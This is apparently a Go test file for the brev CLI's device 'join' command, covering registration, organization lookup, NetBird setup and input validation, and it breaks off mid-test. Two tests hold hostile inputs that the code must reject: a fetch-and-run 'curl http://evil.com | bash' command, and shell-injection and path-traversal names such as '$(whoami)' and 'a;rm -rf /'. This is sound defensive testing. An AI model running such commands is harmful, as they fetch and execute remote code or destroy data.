package register

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
	nodev1 "buf.build/gen/go/brevdev/devplane/protocolbuffers/go/devplaneapi/v1"
	"connectrpc.com/connect"

	"github.com/brevdev/brev-cli/pkg/entity"
	"github.com/brevdev/brev-cli/pkg/externalnode"
	"github.com/brevdev/brev-cli/pkg/sudo"
	"github.com/brevdev/brev-cli/pkg/terminal"
	"github.com/spf13/cobra"
	"github.com/stretchr/testify/require"
)

const legacySSHPortMigrationError = "--ssh-port is no longer supported by brev join or brev register; run brev join, then run brev enable-ssh on the joined machine"

type panicRegisterStore struct{}

func (panicRegisterStore) GetCurrentUser() (*entity.User, error) { panic("GetCurrentUser called") }
func (panicRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	panic("GetActiveOrganizationOrDefault called")
}
func (panicRegisterStore) GetOrganizationsByName(string) ([]entity.Organization, error) {
	panic("GetOrganizationsByName called")
}
func (panicRegisterStore) ListOrganizations() ([]entity.Organization, error) {
	panic("ListOrganizations called")
}
func (panicRegisterStore) GetAccessToken() (string, error) { panic("GetAccessToken called") }

func TestNewCmdJoin_CommandSurface(t *testing.T) {
	cmd := NewCmdJoin(terminal.New(), panicRegisterStore{})
	root := &cobra.Command{Use: "brev"}
	root.AddCommand(cmd)

	resolved, _, err := root.Find([]string{"register"})
	require.NoError(t, err)
	require.Equal(t, "join", cmd.Name())
	require.Equal(t, []string{"register"}, cmd.Aliases)
	require.Same(t, cmd, resolved)
	require.Error(t, cmd.Args(cmd, []string{"unexpected"}))
	require.True(t, cmd.Flags().Lookup("ssh-port").Hidden)
}

func TestNewCmdRegister_DeprecatedSourceCompatibility(t *testing.T) {
	cmd := NewCmdRegister(terminal.New(), panicRegisterStore{})

	require.Equal(t, "join", cmd.Name())
	require.Equal(t, []string{"register"}, cmd.Aliases)
}

func TestNewCmdJoin_RegisterAliasWarnsOnExecution(t *testing.T) {
	cmd := NewCmdJoin(terminal.New(), panicRegisterStore{})
	root := &cobra.Command{Use: "brev", SilenceUsage: true}
	root.AddCommand(cmd)
	var stderr bytes.Buffer
	root.SetErr(&stderr)
	root.SetArgs([]string{"register", "--ssh-port", "22"})

	err := root.Execute()

	require.EqualError(t, err, legacySSHPortMigrationError)
	require.Contains(t, stderr.String(), "Warning: \"brev register\" is deprecated; use \"brev join\" instead.\nThis command no longer enables SSH; run \"brev enable-ssh\" separately.\n")
}

func TestNewCmdJoin_HelpDoesNotWarn(t *testing.T) {
	cmd := NewCmdJoin(terminal.New(), panicRegisterStore{})
	root := &cobra.Command{Use: "brev", SilenceUsage: true}
	root.AddCommand(cmd)
	var stderr bytes.Buffer
	root.SetErr(&stderr)
	root.SetArgs([]string{"register", "--help"})

	require.NoError(t, root.Execute())
	require.Empty(t, stderr.String())
}

func TestNewCmdJoin_LegacySSHPortFailsBeforeSideEffects(t *testing.T) {
	tests := [][]string{
		{"join", "--ssh-port", "0"},
		{"join", "--ssh-port", "22"},
		{"join", "-p", "0"},
		{"join", "-p", "22"},
		{"register", "--ssh-port", "0"},
		{"register", "--ssh-port", "22"},
		{"register", "-p", "0"},
		{"register", "-p", "22"},
	}

	for _, args := range tests {
		t.Run(strings.Join(args, " "), func(t *testing.T) {
			depsConstructed := 0
			cmd := newCmdJoin(terminal.New(), panicRegisterStore{}, func() joinDeps {
				depsConstructed++
				return joinDeps{}
			})
			root := &cobra.Command{Use: "brev", SilenceUsage: true}
			root.AddCommand(cmd)
			root.SetErr(&bytes.Buffer{})
			root.SetArgs(args)

			require.EqualError(t, root.Execute(), legacySSHPortMigrationError)
			// All platform, sudo, authentication, NetBird, RPC, persistence,
			// setup, and hardware work is contained in the dependency factory.
			require.Zero(t, depsConstructed)
		})
	}
}

type recordingJoinPrompter struct {
	prompts []joinPrompt
}

type joinPrompt struct {
	kind  string
	label string
}

func (p *recordingJoinPrompter) ConfirmYesNo(label string) bool {
	p.prompts = append(p.prompts, joinPrompt{kind: "confirm", label: label})
	return true
}
func (p *recordingJoinPrompter) Select(label string, items []string) string {
	p.prompts = append(p.prompts, joinPrompt{kind: "select", label: label})
	return items[0]
}
func (p *recordingJoinPrompter) Input(content terminal.PromptContent) string {
	p.prompts = append(p.prompts, joinPrompt{kind: "input", label: content.Label})
	return "interactive-node"
}

func TestRunJoin_InteractivePromptsOnlyForMembership(t *testing.T) {
	regStore := &mockRegistrationStore{}
	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}
	svc := &fakeNodeService{addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
		return &nodev1.AddNodeResponse{ExternalNode: &nodev1.ExternalNode{
			ExternalNodeId: "unode_abc", OrganizationId: req.GetOrganizationId(), Name: req.GetName(), DeviceId: req.GetDeviceId(),
		}}, nil
	}}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()
	prompter := &recordingJoinPrompter{}
	deps.prompter = prompter

	require.NoError(t, runJoin(context.Background(), terminal.New(), store, joinOpts{interactive: true}, deps))
	require.Equal(t, []joinPrompt{
		{kind: "input", label: "Device name"},
		{kind: "select", label: "Select organization"},
		{kind: "confirm", label: "Proceed with join?"},
	}, prompter.prompts)
}

func TestRunJoin_DoesNotOpenPortOrGrantSSH(t *testing.T) {
	regStore := &mockRegistrationStore{}
	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}
	openCalls, grantCalls := 0, 0
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{ExternalNode: &nodev1.ExternalNode{
				ExternalNodeId: "unode_abc", OrganizationId: req.GetOrganizationId(), Name: req.GetName(), DeviceId: req.GetDeviceId(),
			}}, nil
		},
		openPortFn: func(*nodev1.OpenPortRequest) (*nodev1.OpenPortResponse, error) {
			openCalls++
			return &nodev1.OpenPortResponse{}, nil
		},
		grantNodeSSHAccessFn: func(*nodev1.GrantNodeSSHAccessRequest) (*nodev1.GrantNodeSSHAccessResponse, error) {
			grantCalls++
			return &nodev1.GrantNodeSSHAccessResponse{}, nil
		},
	}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	stdout := captureStdout(t)
	require.NoError(t, runJoin(context.Background(), terminal.New(), store, joinOpts{name: "my-node", orgName: "TestOrg"}, deps))
	require.Equal(t, 0, openCalls)
	require.Equal(t, 0, grantCalls)
	require.Contains(t, stdout(), "brev enable-ssh")
}

func captureStdout(t *testing.T) func() string {
	t.Helper()
	previous := os.Stdout
	reader, writer, err := os.Pipe()
	require.NoError(t, err)
	os.Stdout = writer
	return func() string {
		require.NoError(t, writer.Close())
		os.Stdout = previous
		output, err := io.ReadAll(reader)
		require.NoError(t, err)
		require.NoError(t, reader.Close())
		return string(output)
	}
}

// mockRegisterStore satisfies RegisterStore for orchestration tests.
type mockRegisterStore struct {
	user  *entity.User
	org   *entity.Organization
	orgs  []entity.Organization
	token string
	err   error
}

func (m *mockRegisterStore) GetCurrentUser() (*entity.User, error) {
	if m.err != nil {
		return nil, m.err
	}
	return m.user, nil
}

func (m *mockRegisterStore) GetActiveOrganizationOrDefault() (*entity.Organization, error) {
	return m.org, nil
}

func (m *mockRegisterStore) GetOrganizationsByName(name string) ([]entity.Organization, error) {
	var matched []entity.Organization
	for _, o := range m.orgs {
		if o.Name == name {
			matched = append(matched, o)
		}
	}
	if len(matched) == 0 && m.org != nil && m.org.Name == name {
		matched = append(matched, *m.org)
	}
	return matched, nil
}

func (m *mockRegisterStore) ListOrganizations() ([]entity.Organization, error) {
	if len(m.orgs) > 0 {
		return m.orgs, nil
	}
	if m.org != nil {
		return []entity.Organization{*m.org}, nil
	}
	return nil, nil
}

func (m *mockRegisterStore) GetAccessToken() (string, error) { return m.token, nil }

// mockRegistrationStore satisfies RegistrationStore for orchestration tests.
type mockRegistrationStore struct {
	reg *DeviceRegistration
}

func (m *mockRegistrationStore) Save(reg *DeviceRegistration) error {
	m.reg = reg
	return nil
}

func (m *mockRegistrationStore) Load() (*DeviceRegistration, error) {
	if m.reg == nil {
		return nil, fmt.Errorf("no registration")
	}
	return m.reg, nil
}

func (m *mockRegistrationStore) Delete() error {
	m.reg = nil
	return nil
}

func (m *mockRegistrationStore) Exists() (bool, error) {
	return m.reg != nil, nil
}

// mock types for joinDeps interfaces

type mockPlatform struct{ compatible bool }

func (m mockPlatform) IsCompatible() bool { return m.compatible }

type mockConfirmer struct{ confirm bool }

func (m mockConfirmer) ConfirmYesNo(_ string) bool            { return m.confirm }
func (m mockConfirmer) Input(_ terminal.PromptContent) string { return "" }
func (m mockConfirmer) Select(_ string, items []string) string {
	if len(items) == 0 {
		return ""
	}
	return items[0]
}

type mockNetBirdManager struct{ err error }

func (m mockNetBirdManager) Install() error                        { return m.err }
func (m mockNetBirdManager) Uninstall() error                      { return m.err }
func (m mockNetBirdManager) EnsureConnected(context.Context) error { return m.err }

type reconcilingNetBirdManager struct {
	called bool
	err    error
}

func (m *reconcilingNetBirdManager) Install() error   { return m.err }
func (m *reconcilingNetBirdManager) Uninstall() error { return m.err }
func (m *reconcilingNetBirdManager) EnsureConnected(context.Context) error {
	m.called = true
	return m.err
}

type mockSetupRunner struct {
	called bool
	cmd    string
	err    error
}

func (m *mockSetupRunner) RunSetup(script string) error {
	m.called = true
	m.cmd = script
	return m.err
}

type mockNodeClientFactory struct {
	serverURL string
}

func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
	return NewNodeServiceClient(provider, m.serverURL)
}

// testHardwareProfile returns a realistic HardwareProfile for use in tests.
func testHardwareProfile() *HardwareProfile {
	cpuCount := int32(2)
	ramBytes := int64(131886028) * 1024
	memBytes := int64(131072) * 1024 * 1024
	return &HardwareProfile{
		Architecture: "arm64",
		OS:           "Ubuntu",
		OSVersion:    "24.04",
		GPUs: []GPU{
			{Model: "NVIDIA GB10", Count: 1, MemoryBytes: &memBytes},
		},
		CPUCount: &cpuCount,
		RAMBytes: &ramBytes,
		Storage: []StorageDevice{
			{Name: "nvme0n1", StorageBytes: 500107862016, StorageType: "SSD"},
		},
	}
}

// testJoinDeps returns deps with all side effects stubbed out, and a fake
// ConnectRPC server backed by the provided fakeNodeService.
func testJoinDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationStore) (joinDeps, *httptest.Server) {
	t.Helper()

	_, handler := nodev1connect.NewExternalNodeServiceHandler(svc)
	server := httptest.NewServer(handler)

	return joinDeps{
		platform:    mockPlatform{compatible: true},
		prompter:    mockConfirmer{confirm: true},
		gater:       sudo.CachedGater{},
		netbird:     mockNetBirdManager{},
		setupRunner: &mockSetupRunner{},
		nodeClients: mockNodeClientFactory{serverURL: server.URL},
		hardwareProfiler: &mockHardwareProfiler{
			profile: testHardwareProfile(),
		},
		registrationStore: regStore,
	}, server
}

func Test_runJoin_HappyPath(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			if req.GetOrganizationId() != "org_123" {
				t.Errorf("unexpected org: %s", req.GetOrganizationId())
			}
			if req.GetName() != "my-spark" {
				t.Errorf("unexpected name: %s", req.GetName())
			}
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
					ConnectivityInfo: &nodev1.ConnectivityInfo{
						RegistrationCommand: "netbird up --key abc",
					},
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runJoin failed: %v", err)
	}

	// Verify registration was persisted
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if !exists {
		t.Fatal("expected registration to exist after successful join")
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.ExternalNodeID != "unode_abc" {
		t.Errorf("expected ExternalNodeID unode_abc, got %s", reg.ExternalNodeID)
	}
	if reg.DisplayName != "my-spark" {
		t.Errorf("expected display name 'my-spark', got %s", reg.DisplayName)
	}
	if reg.OrgID != "org_123" {
		t.Errorf("expected org org_123, got %s", reg.OrgID)
	}

	// Verify setup command was executed
	if setupRunner.cmd != "netbird up --key abc" {
		t.Errorf("expected setup command 'netbird up --key abc', got %q", setupRunner.cmd)
	}
}

// gaterFromFunc adapts a function to sudo.Gater; used only by Test_runJoin_UserCancels.
type gaterFromFunc func(*terminal.Terminal, terminal.Confirmer, string, bool) error

func (f gaterFromFunc) Gate(t *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
	return f(t, c, reason, assumeYes)
}

func Test_runJoin_UserCancels(t *testing.T) {
	// User cancel happens in interactive mode (sudo or confirm). Flag-driven has no prompts.
	regStore := &mockRegistrationStore{}
	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}
	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	deps.prompter = mockConfirmer{confirm: false}
	// Use a gater that actually runs the confirmer so the test cancels at the gate
	// instead of proceeding to the device name prompt (CachedGater always passes).
	deps.gater = gaterFromFunc(func(_ *terminal.Terminal, c terminal.Confirmer, reason string, assumeYes bool) error {
		if assumeYes {
			return nil
		}
		if !c.ConfirmYesNo(fmt.Sprintf("%s requires sudo. Continue?", reason)) {
			return fmt.Errorf("%s canceled by user", reason)
		}
		return nil
	})

	term := terminal.New()
	opts := joinOpts{interactive: true, name: "", orgName: ""}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when user declines sudo gate")
	}
	if !strings.Contains(err.Error(), "canceled by user") {
		t.Errorf("expected 'canceled by user' error, got: %v", err)
	}

	exists, _ := regStore.Exists()
	if exists {
		t.Error("registration should not exist after cancel")
	}
}

func Test_runJoin_AlreadyRegistered(t *testing.T) {
	tests := []struct {
		name      string
		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
	}{
		{
			name: "Connected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "Disconnected",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
						ConnectivityInfo: &nodev1.ConnectivityInfo{
							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
						},
					},
				}, nil
			},
		},
		{
			name: "GetNodeFails",
			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return nil, connect.NewError(connect.CodeInternal, nil)
			},
		},
		{
			name: "NilConnectivityInfo",
			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
				return &nodev1.GetNodeResponse{
					ExternalNode: &nodev1.ExternalNode{
						ExternalNodeId: req.GetExternalNodeId(),
					},
				}, nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{
				reg: &DeviceRegistration{
					ExternalNodeID: "unode_existing",
					DisplayName:    "Existing",
					OrgID:          "org_123",
				},
			}

			store := &mockRegisterStore{
				user: &entity.User{ID: "user_1"},
				org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

				token: "tok",
			}

			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
			deps, server := testJoinDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			// Pass the same name as the existing registration so we go through
			// the checkExistingRegistration path (not the different-name path).
			opts := joinOpts{interactive: false, name: "Existing", orgName: "TestOrg"}
			err := runJoin(context.Background(), term, store, opts, deps)
			if err != nil {
				t.Fatalf("expected nil error, got: %v", err)
			}

			exists, _ := regStore.Exists()
			if !exists {
				t.Error("expected registration to still exist")
			}
		})
	}
}

func TestCheckExistingRegistration_ReconcilesLocalTunnel(t *testing.T) {
	regStore := &mockRegistrationStore{
		reg: &DeviceRegistration{
			ExternalNodeID: "unode_existing",
			DisplayName:    "Existing",
			OrgID:          "org_123",
		},
	}
	store := &mockRegisterStore{token: "tok"}
	svc := &fakeNodeService{getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
		return &nodev1.GetNodeResponse{
			ExternalNode: &nodev1.ExternalNode{
				ExternalNodeId: req.GetExternalNodeId(),
				ConnectivityInfo: &nodev1.ConnectivityInfo{
					Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
				},
			},
		}, nil
	}}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()
	tunnel := &reconcilingNetBirdManager{}
	deps.netbird = tunnel

	if err := checkExistingRegistration(context.Background(), terminal.New(), store, deps); err != nil {
		t.Fatalf("checkExistingRegistration() error = %v", err)
	}
	if !tunnel.called {
		t.Fatal("checkExistingRegistration() did not reconcile the local Brev tunnel")
	}
}

func Test_runJoin_NoOrganization(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  nil,

		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no org exists")
	}
}

func Test_runJoin_WithOrgFlag(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs: []entity.Organization{
			{ID: "org_456", Name: "SpecificOrg"},
		},
		token: "tok",
	}

	var capturedOrgID string
	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			capturedOrgID = req.GetOrganizationId()
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: req.GetOrganizationId(),
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()
	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "SpecificOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runJoin with --org failed: %v", err)
	}

	if capturedOrgID != "org_456" {
		t.Errorf("expected org_456, got %s", capturedOrgID)
	}

	reg, err := regStore.Load()
	if err != nil {
		t.Fatalf("Load failed: %v", err)
	}
	if reg.OrgID != "org_456" {
		t.Errorf("expected registration org org_456, got %s", reg.OrgID)
	}
}

func Test_runJoin_WithOrgFlag_NotFound(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_default", Name: "DefaultOrg"},
		orgs:  []entity.Organization{},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "NonexistentOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when org not found")
	}
	if !strings.Contains(err.Error(), "no organization found") {
		t.Errorf("expected 'no organization found' error, got: %v", err)
	}
}

func Test_runJoin_AddNodeFails(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(_ *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return nil, connect.NewError(connect.CodeInternal, nil)
		},
	}

	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when AddNode fails")
	}

	// Registration should not exist on failure
	exists, err := regStore.Exists()
	if err != nil {
		t.Fatalf("Exists error: %v", err)
	}
	if exists {
		t.Error("registration should not exist after AddNode failure")
	}
}

func Test_runJoin_NoSetupCommand(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user: &entity.User{ID: "user_1"},
		org:  &entity.Organization{ID: "org_123", Name: "TestOrg"},

		token: "tok",
	}

	svc := &fakeNodeService{
		addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
			return &nodev1.AddNodeResponse{
				ExternalNode: &nodev1.ExternalNode{
					ExternalNodeId: "unode_abc",
					OrganizationId: "org_123",
					Name:           req.GetName(),
					DeviceId:       req.GetDeviceId(),
				},
				// No ConnectivityInfo / RegistrationCommand
			}, nil
		},
	}

	setupRunner := &mockSetupRunner{}

	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	deps.setupRunner = setupRunner

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err != nil {
		t.Fatalf("runJoin failed: %v", err)
	}

	if setupRunner.called {
		t.Error("setup command should not be called when empty")
	}
}

func Test_runSetupCommand_Validation(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		expectReject bool
	}{
		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := runSetupCommand(tt.cmd)
			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
			if tt.expectReject && !rejected {
				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
			}
			if !tt.expectReject && rejected {
				t.Errorf("expected command to be accepted, but got: %v", err)
			}
		})
	}
}

func Test_netbirdManagementConnected(t *testing.T) {
	connectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Connected
Signal: Connected
Relays: 3/3 Available
Nameservers: 0/0 Available
FQDN: client-3dbe844c.lp.local
NetBird IP: 100.108.207.143/16
Interface type: Kernel
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 3/4 Connected`

	disconnectedOutput := `OS: linux/amd64
Daemon version: 0.66.1
CLI version: 0.66.1
Profile: default
Management: Disconnected
Signal: Disconnected
Relays: 0/2 Available
Nameservers: 0/0 Available
FQDN:
NetBird IP: N/A
Interface type: N/A
Quantum resistance: false
Lazy connection: false
SSH Server: Disabled
Networks: -
Peers count: 0/0 Connected`

	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"Connected", connectedOutput, true},
		{"Disconnected", disconnectedOutput, false},
		{"EmptyString", "", false},
		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := netbirdManagementConnected(tt.input)
			if got != tt.want {
				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
			}
		})
	}
}

func Test_runJoin_NameValidation(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantErr   bool
		errSubstr string
	}{
		{"Valid", "my-dgx-spark", false, ""},
		{"WithDots", "node.local.1", false, ""},
		{"WithUnderscore", "my_node", false, ""},
		{"Spaces", "My Spark", true, "letters, digits"},
		{"ShellInjection", "$(whoami)", true, "letters, digits"},
		{"PathTraversal", "../etc/passwd", true, "letters, digits"},
		{"Backticks", "`rm -rf`", true, "letters, digits"},
		{"Semicolon", "a;rm -rf /", true, "letters, digits"},
		{"LeadingHyphen", "-node", true, "start with"},
		{"LeadingDot", ".hidden", true, "start with"},
		{"TooLong", strings.Repeat("a", 64), true, "63 characters"},
		{"Empty", "", true, "--name"}, // flag-driven rejects empty name with this message
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			regStore := &mockRegistrationStore{}
			store := &mockRegisterStore{
				user:  &entity.User{ID: "user_1"},
				org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
				token: "tok",
			}

			svc := &fakeNodeService{
				addNodeFn: func(req *nodev1.AddNodeRequest) (*nodev1.AddNodeResponse, error) {
					return &nodev1.AddNodeResponse{
						ExternalNode: &nodev1.ExternalNode{
							ExternalNodeId: "unode_abc",
							OrganizationId: "org_123",
							Name:           req.GetName(),
							DeviceId:       req.GetDeviceId(),
						},
					}, nil
				},
			}

			deps, server := testJoinDeps(t, svc, regStore)
			defer server.Close()

			term := terminal.New()
			var err error
			opts := joinOpts{interactive: false, name: tt.input, orgName: "TestOrg"}
			err = runJoin(context.Background(), term, store, opts, deps)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				if !strings.Contains(err.Error(), tt.errSubstr) {
					t.Errorf("expected error containing %q, got: %v", tt.errSubstr, err)
				}
			} else if err != nil {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}
}

func Test_runJoin_PlatformIncompatible(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	deps.platform = mockPlatform{compatible: false}

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when platform is incompatible")
	}
	if !strings.Contains(err.Error(), "only supported on Linux") {
		t.Errorf("expected platform incompatibility error, got: %v", err)
	}
}

func Test_runJoin_HardwareProfilerFailure(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	deps.hardwareProfiler = &mockHardwareProfiler{err: fmt.Errorf("nvml init failed")}

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when hardware profiler fails")
	}
	if !strings.Contains(err.Error(), "hardware profile") {
		t.Errorf("expected hardware profile error, got: %v", err)
	}
}

func Test_runJoin_NetBirdInstallFailure(t *testing.T) {
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	deps.netbird = mockNetBirdManager{err: fmt.Errorf("install failed")}

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "my-spark", orgName: "TestOrg"}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when NetBird install fails")
	}
	if !strings.Contains(err.Error(), "tunnel setup failed") {
		t.Errorf("expected tunnel setup error, got: %v", err)
	}
}

func Test_runJoin_NoNameNotRegistered(t *testing.T) {
	// In flag-driven mode, missing --name and --org must error (no prompts).
	regStore := &mockRegistrationStore{}

	store := &mockRegisterStore{
		user:  &entity.User{ID: "user_1"},
		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
		token: "tok",
	}

	svc := &fakeNodeService{}
	deps, server := testJoinDeps(t, svc, regStore)
	defer server.Close()

	term := terminal.New()
	opts := joinOpts{interactive: false, name: "", orgName: ""}
	err := runJoin(context.Background(), term, store, opts, deps)
	if err == nil {
		t.Fatal("expected error when no name/org in non-interactive mode")
	}
	if !strings.Contains(err.Error(), "non-interactive") || !strings.Contains(err.Error(), "--name") {
		t.Errorf("expected non-interactive/--name error, got: %v", err)
	}
}

func Test_runJoin_NoNameAlreadyRegistered(t *testing.T) {
	regStore := &mockRegistrationStore{
		reg: &DeviceRegistration{
			ExternalNodeID: "unode_existing",
			DisplayName:    "Existing Device",
			OrgID:          "org_123",
		},
	}

	store := &mockRegisterStore{
